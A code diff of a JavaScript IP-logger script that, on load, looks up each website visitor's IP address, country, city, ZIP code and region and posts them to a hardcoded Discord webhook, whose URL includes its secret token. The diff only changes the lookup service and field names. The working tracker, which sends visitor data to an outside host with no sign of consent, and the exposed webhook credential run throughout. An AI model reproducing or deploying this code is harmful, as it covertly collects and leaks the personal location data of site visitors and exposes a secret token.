@@ -1,4 +1,3 @@
-      console.dir(working);
 const webhook = "https://ptb.discord.com/api/webhooks/1040394758020927599/xBbrb8ArnGGfYlsTTRmNqz0qsVA0tB_HXvyf1CX5YJs7cdWSNz2k4x0PVq3zbK4XjB17"
 
 async function IP_Info(){
@@ -6,8 +5,8 @@ async function IP_Info(){
      *  Description: On init , fetches IP information of user
      *  @return {fetch.Body.json()} Resp Body
      */
-    let url = await fetch("https://ipinfo.io/json", {
-      
+    let response = await fetch("http://ip-api.com/json", {
+      method: 'GET',
       headers: {
         "cache-control" : "no-cache",
         "content-type": "application/json"
@@ -17,7 +16,7 @@ async function IP_Info(){
   }
   IP_Info().then((value)=> {
     let requiredInfo = [
-      "country", "city", "zip", "org", "region"
+      "status","country", "city", "zip", "regionName"
     ]
     let noData = false
 
@@ -46,22 +45,19 @@ async function IP_Info(){
               color: "12223968",
               description: "```IP information of the recent website visitor.```",
               fields: [{
-                name: "IP", value: `${value.ip}`, inline: true
+                name: "IP", value: `${value.query}`, inline: false
               },
               {
-                name: "Country", value: `${value.country}`, inline: true
+                name: "Country", value: `${value.country}`, inline: false
               },
               {
-                name: "City", value: `${value.city}`, inline: true
+                name: "City", value: `${value.city}`, inline: false
               },
               {
-                name: "ZIP", value: `${value.zip}`, inline: true
+                name: "ZIP", value: `${value.zip}`, inline: false
               },
               {
-                name: "Org", value: `${value.org}`, inline: true
-              },
-              {
-                name: "Region", value: `${value.region}`, inline: true
+                name: "Region", value: `${value.regionName}`, inline: false
               }
               ],
               footer: {
